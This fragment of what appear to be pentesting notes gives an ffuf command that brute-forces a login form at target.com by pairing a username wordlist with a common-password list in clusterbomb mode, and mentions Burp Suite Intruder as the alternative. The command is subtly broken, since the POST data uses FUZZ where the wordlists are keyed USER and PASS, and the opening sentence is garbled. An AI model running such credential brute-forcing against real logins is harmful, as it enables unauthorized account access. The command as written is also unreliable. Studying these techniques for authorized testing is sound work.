-  Can you Burp Suite Intruder for this, but i am using `ffuf` tool, because its faster.

```shell

ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=FUZZ" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER \
  -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:PASS \
  -mode clusterbomb

```
